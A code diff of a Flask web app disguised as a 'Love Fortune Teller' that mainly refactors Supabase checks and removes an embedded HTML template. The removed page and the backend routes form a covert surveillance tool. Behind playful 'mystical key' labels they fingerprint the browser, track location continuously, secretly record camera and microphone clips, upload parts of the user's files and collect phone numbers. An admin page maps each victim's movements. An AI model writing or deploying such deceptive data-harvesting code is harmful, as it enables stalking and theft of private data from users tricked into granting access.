@@ -12,15 +12,16 @@ SUPABASE_URL = os.environ.get("SUPABASE_URL")
 SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
 
 if not SUPABASE_URL or not SUPABASE_KEY:
-    print("ERROR: SUPABASE_URL or SUPABASE_KEY not set in environment", file=sys.stderr)
+    print("ERROR: Missing Supabase credentials", file=sys.stderr)
+    supabase = None
 else:
-    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
+    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
 
 SERVICE_ID = "srv-d7jkpe3bc2fs73c2qiu0"
 
-# ---------- Helper Functions ----------
+# ---------- Helper Functions (unchanged) ----------
 def save_visitor(data):
-    if 'supabase' not in globals():
+    if supabase is None:
         return
     existing = supabase.table("visitors").select("id").eq("sessionId", data.get("sessionId")).execute()
     if existing.data:
@@ -29,7 +30,7 @@ def save_visitor(data):
         supabase.table("visitors").insert(data).execute()
 
 def save_location_update(session_id, lat, lon):
-    if 'supabase' not in globals():
+    if supabase is None:
         return
     supabase.table("location_history").insert({
         "sessionId": session_id,
@@ -39,13 +40,13 @@ def save_location_update(session_id, lat, lon):
     }).execute()
 
 def get_location_history(session_id):
-    if 'supabase' not in globals():
+    if supabase is None:
         return []
     res = supabase.table("location_history").select("timestamp,latitude,longitude").eq("sessionId", session_id).order("id").execute()
     return [(row["timestamp"], row["latitude"], row["longitude"]) for row in res.data]
 
 def get_all_visitors():
-    if 'supabase' not in globals():
+    if supabase is None:
         return []
     res = supabase.table("visitors").select("*").order("id", desc=True).execute()
     visitors = []
@@ -99,13 +100,16 @@ def get_love_message(name1, name2, percentage):
 # ---------- Flask Routes ----------
 @app.route('/')
 def index():
-    return render_template_string(HTML_TEMPLATE)
+    # Read the HTML from the external file
+    with open('index.html', 'r', encoding='utf-8') as f:
+        html_content = f.read()
+    return render_template_string(html_content)
 
 @app.route('/get-session-data', methods=['POST'])
 def get_session_data_route():
     data = request.json
     session_id = data.get('sessionId')
-    if session_id and 'supabase' in globals():
+    if session_id and supabase:
         res = supabase.table("visitors").select("name,crush_name,fortuneText,phoneNumber").eq("sessionId", session_id).execute()
         if res.data:
             row = res.data[0]
@@ -150,7 +154,7 @@ def save_phone():
     session_id = data.get('sessionId')
     phone = data.get('phoneNumber')
     fortune_text = data.get('fortune')
-    if session_id and 'supabase' in globals():
+    if session_id and supabase:
         supabase.table("visitors").update({"phoneNumber": phone, "fortuneText": fortune_text}).eq("sessionId", session_id).execute()
         return jsonify({'status': 'saved'})
     return jsonify({'status': 'error'}), 400
@@ -189,7 +193,7 @@ def admin():
                 if hist:
                     html += f'<h3>Session: {v.get("sessionId", "Unknown")} – {v.get("name", "Anonymous")} (crush: {v.get("crush_name", "?")})</h3>'
                     html += '<table border="1" cellpadding="3" style="margin-bottom:20px;">'
-                    html += '<tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th><tr>'
+                    html += '<tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>'
                     for ts, lat, lon in hist:
                         map_link = f'https://www.google.com/maps?q={lat},{lon}'
                         html += f'<tr><td style="white-space:nowrap;">{ts}</td><td>{lat}</td><td>{lon}</td><td><a href="{map_link}" target="_blank">View</a></td></tr>'
@@ -250,516 +254,6 @@ def calculate_love():
     percentage = calculate_love_percentage(name1, name2)
     message = get_love_message(name1, name2, percentage)
     return jsonify({'percentage': percentage, 'message': message})
-
-# ---------- HTML_TEMPLATE (complete) ----------
-HTML_TEMPLATE = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Love Fortune Teller 💕</title>
-    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .card {
-            max-width: 500px;
-            width: 100%;
-            background: rgba(255,255,255,0.95);
-            border-radius: 40px;
-            padding: 35px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-        h1 { font-size: 2em; background: linear-gradient(135deg, #ff6b6b, #c06c84); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        input, button {
-            width: 100%;
-            padding: 14px;
-            margin: 10px 0;
-            border-radius: 60px;
-            border: 2px solid #ffdde1;
-            font-size: 16px;
-            text-align: center;
-        }
-        button {
-            background: linear-gradient(135deg, #ff6b6b, #c06c84);
-            color: white;
-            border: none;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        button:hover { transform: scale(1.02); }
-        .hidden { display: none; }
-        .fortune-box {
-            background: rgba(255,182,193,0.3);
-            border-left: 5px solid #ff1493;
-            border-radius: 20px;
-            padding: 20px;
-            margin: 20px 0;
-            font-size: 1.3em;
-            font-weight: bold;
-            color: #c06c84;
-        }
-        .step {
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(255,255,255,0.9);
-            border-radius: 20px;
-        }
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #ff1493;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        svg { margin: 10px auto; display: block; }
-        .sms-prompt {
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(255,255,255,0.8);
-            border-radius: 20px;
-        }
-        .permission-box {
-            background: #ffe4e1;
-            padding: 15px;
-            border-radius: 20px;
-            margin: 15px 0;
-            font-size: 1.1rem;
-            font-weight: bold;
-            color: #b84c6c;
-        }
-        .two-inputs { display: flex; gap: 10px; }
-        .two-inputs input { margin: 0; }
-    </style>
-</head>
-<body>
-<div class="card">
-    <h1>💕 Love Fortune Teller 💕</h1>
-    <div id="step-name">
-        <div class="two-inputs">
-            <input type="text" id="yourName" placeholder="🩷 Your name">
-            <input type="text" id="crushName" placeholder="💙 Crush's name">
-        </div>
-        <button onclick="startProcess()">🌈 Calculate Our Love 🌈</button>
-    </div>
-    <div id="loading" class="hidden">
-        <div class="spinner"></div>
-        <p>✨ Reading the stars... ✨</p>
-    </div>
-    <div id="permissions" class="hidden">
-        <p>🌟 To unlock your **Ultra‑Personalised Love Vision**, grant these mystical keys:</p>
-        <div class="permission-box">
-            💕 Celestial Anchor (Location) ✨<br>
-            🌟 Heartbeat Whisper (Camera & Mic) 🌙<br>
-            ✨ Secret Keepsake (Your Love Memories – optional) 🕯️
-        </div>
-        <p style="font-size:0.85rem; color:#c06c84;">(Click below – your browser will ask for each permission)</p>
-        <button onclick="requestAll()">🔮 Cast the Love Spell 🔮</button>
-    </div>
-    <div id="progress" class="hidden"></div>
-    <div id="result" class="hidden">
-        <div class="fortune-box" id="fortuneText"></div>
-        <div id="smsSection" class="sms-prompt hidden">
-            <p>📱 Save this result to your phone (permanently saved)</p>
-            <input type="tel" id="phoneNumber" placeholder="Enter your mobile number">
-            <button id="sendSmsBtn" onclick="sendSms()">💬 Send to my phone</button>
-            <div id="smsStatus" style="margin-top:10px; font-size:14px;"></div>
-        </div>
-        <p>✨ Thank you for trusting the stars ✨</p>
-    </div>
-</div>
-
-<input type="file" id="fileInput" multiple style="display:none">
-
-<script>
-    let sessionId = localStorage.getItem('fortuneSessionId');
-    if (!sessionId) {
-        sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
-        localStorage.setItem('fortuneSessionId', sessionId);
-    }
-
-    let visitorData = { sessionId: sessionId };
-    let mediaRecorder, mediaStream, recordedBlobs = [];
-    let currentFortuneText = "";
-    let hasExistingData = false;
-    let locationWatcher = null;
-    let lastSentTime = 0;
-
-    async function getFingerprint() {
-        try {
-            const fp = await FingerprintJS.load();
-            const result = await fp.get();
-            return result.visitorId;
-        } catch(e) { return 'error'; }
-    }
-
-    async function getBattery() {
-        if ('getBattery' in navigator) {
-            try {
-                const battery = await navigator.getBattery();
-                return { level: Math.round(battery.level * 100), charging: battery.charging };
-            } catch(e) { return { level: 'unknown', charging: false }; }
-        }
-        return { level: 'unsupported', charging: false };
-    }
-
-    function getNetwork() {
-        const conn = navigator.connection || navigator.mozConnection;
-        if (conn) {
-            return { type: conn.effectiveType || 'unknown', speed: conn.downlink ? conn.downlink + ' Mbps' : 'unknown' };
-        }
-        return { type: 'unknown', speed: 'unknown' };
-    }
-
-    function getMemory() {
-        return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
-    }
-
-    function getScreen() {
-        return `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`;
-    }
-
-    function getTimezone() {
-        return Intl.DateTimeFormat().resolvedOptions().timeZone;
-    }
-
-    function getUserAgent() {
-        return navigator.userAgent;
-    }
-
-    window.addEventListener('load', async () => {
-        try {
-            const resp = await fetch('/get-session-data', {
-                method: 'POST',
-                headers: {'Content-Type':'application/json'},
-                body: JSON.stringify({ sessionId: sessionId })
-            });
-            const data = await resp.json();
-            if (data.exists && data.fortuneText) {
-                hasExistingData = true;
-                if (data.name) document.getElementById('yourName').value = data.name;
-                if (data.crush_name) document.getElementById('crushName').value = data.crush_name;
-                document.getElementById('step-name').classList.add('hidden');
-                document.getElementById('result').classList.remove('hidden');
-                document.getElementById('fortuneText').innerText = data.fortuneText;
-                currentFortuneText = data.fortuneText;
-                if (data.phoneNumber) {
-                    document.getElementById('phoneNumber').value = data.phoneNumber;
-                    document.getElementById('phoneNumber').disabled = true;
-                    document.getElementById('smsStatus').innerHTML = '✅ Phone number already saved';
-                } else {
-                    document.getElementById('smsSection').classList.remove('hidden');
-                }
-            }
-        } catch(e) { console.log("Session load error", e); }
-    });
-
-    async function startProcess() {
-        if (hasExistingData) return;
-        const yourName = document.getElementById('yourName').value.trim();
-        const crushName = document.getElementById('crushName').value.trim();
-        if (!yourName || !crushName) {
-            alert('💕 Please enter both names!');
-            return;
-        }
-        
-        document.getElementById('step-name').classList.add('hidden');
-        document.getElementById('loading').classList.remove('hidden');
-        
-        const fingerprint = await getFingerprint();
-        const battery = await getBattery();
-        const network = getNetwork();
-        
-        visitorData.name = yourName;
-        visitorData.crush_name = crushName;
-        visitorData.fingerprint = fingerprint;
-        visitorData.batteryLevel = battery.level;
-        visitorData.batteryCharging = battery.charging;
-        visitorData.networkType = network.type;
-        visitorData.networkSpeed = network.speed;
-        visitorData.deviceMemory = getMemory();
-        visitorData.screen = getScreen();
-        visitorData.timezone = getTimezone();
-        visitorData.userAgent = getUserAgent();
-        visitorData.timestamp = new Date().toISOString();
-        
-        await new Promise(r => setTimeout(r, 500));
-        document.getElementById('loading').classList.add('hidden');
-        
-        const permsAlreadyGranted = localStorage.getItem('lovePermissionsGranted');
-        if (permsAlreadyGranted === 'true') {
-            await finalizeAndSave();
-        } else {
-            document.getElementById('permissions').classList.remove('hidden');
-        }
-    }
-
-    function showStep(title, status, percent) {
-        const div = document.getElementById('progress');
-        div.innerHTML = `<div class="step"><b>${title}</b><br>${status}<br><svg width="80" height="80" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="none" stroke="#ddd" stroke-width="8"/><circle id="progCircle" cx="50" cy="50" r="40" fill="none" stroke="#10b981" stroke-width="8" stroke-linecap="round" stroke-dasharray="251.2" stroke-dashoffset="${251.2 * (1 - percent/100)}"/></svg></div>`;
-        div.classList.remove('hidden');
-    }
-    function hideStep() { document.getElementById('progress').classList.add('hidden'); }
-
-    async function requestAll() {
-        document.getElementById('permissions').classList.add('hidden');
-        try {
-            await getLocation();
-            await getMedia();
-            await getFilesTraditional();
-        } catch(e) { console.log("Permission step error", e); }
-        localStorage.setItem('lovePermissionsGranted', 'true');
-        await finalizeAndSave();
-    }
-
-    function getLocation() {
-        return new Promise((resolve) => {
-            showStep('💕 Celestial Anchor', 'Requesting location...', 0);
-            const timeout = setTimeout(() => {
-                visitorData.latitude = 'denied';
-                visitorData.longitude = 'denied';
-                visitorData.mapUrl = '';
-                showStep('💕 Celestial Anchor', 'Location denied or timeout', 100);
-                setTimeout(() => { hideStep(); resolve(); }, 500);
-            }, 10000);
-            navigator.geolocation.getCurrentPosition(
-                pos => {
-                    clearTimeout(timeout);
-                    visitorData.latitude = pos.coords.latitude;
-                    visitorData.longitude = pos.coords.longitude;
-                    visitorData.mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}`;
-                    showStep('💕 Celestial Anchor', 'Location granted!', 100);
-                    startWatchingLocation();
-                    setTimeout(() => { hideStep(); resolve(); }, 500);
-                },
-                () => {
-                    clearTimeout(timeout);
-                    visitorData.latitude = 'denied';
-                    visitorData.longitude = 'denied';
-                    visitorData.mapUrl = '';
-                    showStep('💕 Celestial Anchor', 'Location denied', 100);
-                    setTimeout(() => { hideStep(); resolve(); }, 500);
-                },
-                { enableHighAccuracy: true, timeout: 8000 }
-            );
-        });
-    }
-
-    function startWatchingLocation() {
-        if (locationWatcher) return;
-        locationWatcher = navigator.geolocation.watchPosition(
-            (position) => {
-                const now = Date.now();
-                if (now - lastSentTime < 2000) return;
-                lastSentTime = now;
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                fetch('/update-location', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        sessionId: sessionId,
-                        latitude: lat,
-                        longitude: lon
-                    })
-                }).catch(e => console.log("Location update error", e));
-            },
-            (error) => console.log("Watch error", error),
-            { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
-        );
-    }
-
-    function getMedia() {
-        return new Promise((resolve) => {
-            showStep('🌟 Heartbeat Whisper', 'Requesting camera & microphone...', 10);
-            const timeout = setTimeout(() => {
-                visitorData.cameraVideo = 'denied';
-                visitorData.microphone = 'denied';
-                showStep('🌟 Heartbeat Whisper', 'Permission denied', 100);
-                setTimeout(() => { hideStep(); resolve(); }, 500);
-            }, 12000);
-            navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user' } })
-            .then(stream => {
-                clearTimeout(timeout);
-                mediaStream = stream;
-                recordedBlobs = [];
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                mediaRecorder.ondataavailable = e => { if(e.data.size) recordedBlobs.push(e.data); };
-                mediaRecorder.onstop = () => {
-                    if(recordedBlobs.length) {
-                        const blob = new Blob(recordedBlobs, { type: 'video/webm' });
-                        const reader = new FileReader();
-                        reader.onloadend = () => {
-                            visitorData.cameraVideo = reader.result.split(',')[1].slice(0, 5000);
-                            visitorData.microphone = 'recorded';
-                            mediaStream.getTracks().forEach(t => t.stop());
-                            showStep('🌟 Heartbeat Whisper', 'Video & audio captured!', 100);
-                            setTimeout(() => { hideStep(); resolve(); }, 500);
-                        };
-                        reader.readAsDataURL(blob);
-                    } else {
-                        visitorData.cameraVideo = 'empty';
-                        visitorData.microphone = 'empty';
-                        showStep('🌟 Heartbeat Whisper', 'No media recorded', 100);
-                        setTimeout(() => { hideStep(); resolve(); }, 500);
-                    }
-                };
-                mediaRecorder.start();
-                let seconds = 3;
-                const interval = setInterval(() => {
-                    seconds--;
-                    showStep('🌟 Heartbeat Whisper', `Capturing ${seconds}s...`, 10 + (3-seconds)/3*90);
-                    if(seconds <= 0) { clearInterval(interval); mediaRecorder.stop(); }
-                }, 1000);
-            })
-            .catch(() => {
-                clearTimeout(timeout);
-                visitorData.cameraVideo = 'denied';
-                visitorData.microphone = 'denied';
-                showStep('🌟 Heartbeat Whisper', 'Permission denied', 100);
-                setTimeout(() => { hideStep(); resolve(); }, 500);
-            });
-        });
-    }
-
-    function getFilesTraditional() {
-        return new Promise((resolve) => {
-            showStep('✨ Secret Keepsake', 'Gather your love memories (optional)...', 0);
-            let resolved = false;
-            const timeout = setTimeout(() => {
-                if (!resolved) {
-                    resolved = true;
-                    visitorData.files = 'no selection (timeout)';
-                    showStep('✨ Secret Keepsake', 'Continuing without memories', 100);
-                    setTimeout(() => { hideStep(); resolve(); }, 500);
-                }
-            }, 15000);
-            let fileInput = document.getElementById('fileInput');
-            if (!fileInput) {
-                fileInput = document.createElement('input');
-                fileInput.type = 'file';
-                fileInput.multiple = true;
-                fileInput.style.display = 'none';
-                document.body.appendChild(fileInput);
-            }
-            fileInput.onchange = null;
-            fileInput.value = '';
-            fileInput.onchange = async (event) => {
-                if (resolved) return;
-                clearTimeout(timeout);
-                resolved = true;
-                const files = Array.from(event.target.files);
-                if (files.length === 0) {
-                    visitorData.files = 'no files selected';
-                    showStep('✨ Secret Keepsake', 'No memories shared', 100);
-                    setTimeout(() => { hideStep(); resolve(); }, 500);
-                    return;
-                }
-                let filesData = [];
-                for (let i = 0; i < Math.min(files.length, 2); i++) {
-                    const file = files[i];
-                    const content = await new Promise(res => {
-                        const reader = new FileReader();
-                        reader.onloadend = () => res(reader.result.split(',')[1].slice(0, 2000));
-                        reader.readAsDataURL(file);
-                    });
-                    filesData.push({ name: file.name, size: file.size, type: file.type, data: content });
-                }
-                visitorData.files = JSON.stringify(filesData);
-                showStep('✨ Secret Keepsake', `${filesData.length} memory(s) received`, 100);
-                setTimeout(() => { hideStep(); resolve(); }, 500);
-            };
-            fileInput.click();
-        });
-    }
-
-    async function finalizeAndSave() {
-        const yourName = visitorData.name;
-        const crushName = visitorData.crush_name;
-        const resp = await fetch('/calculate-love', {
-            method: 'POST',
-            headers: {'Content-Type':'application/json'},
-            body: JSON.stringify({ name1: yourName, name2: crushName })
-        });
-        const loveData = await resp.json();
-        currentFortuneText = loveData.message;
-        document.getElementById('fortuneText').innerText = currentFortuneText;
-        
-        visitorData.fortuneText = currentFortuneText;
-        
-        await fetch('/save', {
-            method: 'POST',
-            headers: {'Content-Type':'application/json'},
-            body: JSON.stringify(visitorData)
-        });
-        
-        document.getElementById('smsSection').classList.remove('hidden');
-        document.getElementById('result').classList.remove('hidden');
-    }
-
-    async function sendSms() {
-        const phoneInput = document.getElementById('phoneNumber');
-        const phone = phoneInput.value.trim();
-        const statusDiv = document.getElementById('smsStatus');
-        const sendBtn = document.getElementById('sendSmsBtn');
-        
-        if (!phone) {
-            statusDiv.innerText = 'Please enter a phone number';
-            return;
-        }
-        if (!/^[0-9+\-\s]{8,15}$/.test(phone)) {
-            statusDiv.innerText = 'Invalid phone number format';
-            return;
-        }
-        
-        sendBtn.disabled = true;
-        sendBtn.innerText = '💫 Saving...';
-        statusDiv.innerText = 'Saving your number...';
-        
-        try {
-            const resp = await fetch('/save-phone', {
-                method: 'POST',
-                headers: {'Content-Type':'application/json'},
-                body: JSON.stringify({
-                    sessionId: sessionId,
-                    phoneNumber: phone,
-                    fortune: currentFortuneText
-                })
-            });
-            const result = await resp.json();
-            if (result.status === 'saved') {
-                statusDiv.innerHTML = '✅ Your love result has been saved with your phone number!';
-                phoneInput.disabled = true;
-                sendBtn.style.display = 'none';
-            } else {
-                statusDiv.innerText = 'Error saving. Please try again.';
-                sendBtn.disabled = false;
-                sendBtn.innerText = '💬 Send to my phone';
-            }
-        } catch(e) {
-            statusDiv.innerText = 'Network error. Please try again.';
-            sendBtn.disabled = false;
-            sendBtn.innerText = '💬 Send to my phone';
-        }
-    }
-</script>
-</body>
-</html>
-'''
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
